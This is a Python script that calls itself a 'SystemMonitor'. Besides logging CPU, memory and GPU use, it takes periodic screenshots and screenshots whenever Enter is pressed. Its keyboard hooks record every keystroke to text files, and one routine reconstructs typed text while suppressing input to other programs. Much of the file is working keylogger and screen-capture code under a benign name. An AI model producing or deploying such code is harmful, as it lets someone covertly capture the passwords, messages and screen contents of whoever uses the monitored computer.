import os
import pyautogui
import time
import datetime
import keyboard
import logging
import threading
import psutil
import GPUtil

class SystemMonitor:
    def __init__(self, log_dir="logs", text_file="typed_words.txt"):
        self.log_dir = log_dir
        self.text_file = text_file
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        today = datetime.date.today().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_dir, f"system_monitor_{today}.log")
        for handler in logging.root.handlers[:]:
            logging.root.removeHandler(handler)
        logging.basicConfig(filename=log_file, level=logging.INFO, 
                            format="%(asctime)s - %(message)s",)
        
        self.logger = logging.getLogger("system_monitor")
        self.logger.propagate = False

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_file = os.path.join(self.log_dir, f"screenshot_{timestamp}.png")
        screenshot.save(screenshot_file)
        logging.info(f"Screenshot taken and saved at {screenshot_file}")

    def check_system_status(self):
        cpu_percent = psutil.cpu_percent(interval=1)  
        logging.info(f"---> CPU usage: {cpu_percent}%")
        logging.info("--------------------")


        memory = psutil.virtual_memory()

        logging.info(f"---> Total RAM: {memory.total / (1024 ** 3):.2f} GB")
        logging.info(f"---> Used RAM: {memory.used / (1024 ** 3):.2f} GB")
        logging.info(f"---> Free RAM: {memory.free / (1024 ** 3):.2f} GB")
        logging.info(f"---> Memory usage: {memory.percent}%")
        logging.info("--------------------")

        gpus = GPUtil.getGPUs()

        for gpu in gpus:
            logging.info(f"---> GPU: {gpu.name}")
            logging.info(f"---> GPU Memory Total: {gpu.memoryTotal} MB")
            logging.info(f"---> GPU Memory Used: {gpu.memoryUsed} MB")
            logging.info(f"---> GPU Memory Free: {gpu.memoryFree} MB")
            logging.info(f"---> GPU Memory Usage: {gpu.memoryUtil * 100}%")
            logging.info(f"---> GPU Temperature: {gpu.temperature} °C")
        logging.info("--------------------")


    def monitor_system(self):
        while True:
            self.check_system_status()
            self.take_screenshot()
            time.sleep(3600) 

    def start_monitoring(self):
        while True:
            if keyboard.is_pressed('enter'): 
                self.take_screenshot()
                time.sleep(1)  

    def save_typed_word(self, key):
        with open(self.text_file, "a", encoding="utf-8") as file:
            file.write(key.name + " ")  

    def start_typing_monitoring(self):
        keyboard.hook(self.save_typed_word)  

    def log_keys(self, duration=10, output_file="logs/output.txt"):
        typed_text = []

        def record_keys():
            nonlocal typed_text
            while not stop_event.is_set():
                event = keyboard.read_event(suppress=True)
                if event.event_type == "down":
                    key = event.name
                    if key == "space":
                        typed_text.append(" ")
                    elif key == "enter":
                        typed_text.append("\n")
                    elif key == "backspace":
                        if typed_text:
                            typed_text.pop()
                    elif len(key) == 1:
                        typed_text.append(key)

        stop_event = threading.Event()

        recorder_thread = threading.Thread(target=record_keys)
        recorder_thread.start()

        time.sleep(duration)
        stop_event.set()

        recorder_thread.join()

        with open(output_file, "w", encoding="utf-8") as f:
            f.write("".join(typed_text))

        print(f"Text saved to {output_file}")

    def start(self):
        threading.Thread(target=self.monitor_system, daemon=True).start()  
        threading.Thread(target=self.start_monitoring, daemon=True).start()
        threading.Thread(target=self.log_keys, daemon=True).start() 

        logging.info("System monitoring started.")

if __name__ == "__main__":
    monitor = SystemMonitor()
    monitor.start()  


    os.system('cls' if os.name == 'nt' else 'clear')
    text_start = "the tool is running "
    while True:
        for i in range(0, len(text_start)):
            os.system('cls' if os.name == 'nt' else 'clear')
            txt = text_start[i]
            spilt_one = text_start[:i]
            spilt_two = text_start[i+1:]
            
            if txt == " " or txt == ".":
                continue
            print(f'{spilt_one}{txt.upper()}{spilt_two}\\')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt.lower()}{spilt_two}|')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt.lower()}{spilt_two}/')
            time.sleep(0.15)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{spilt_one}{txt}{spilt_two}--')
            time.sleep(0.10)
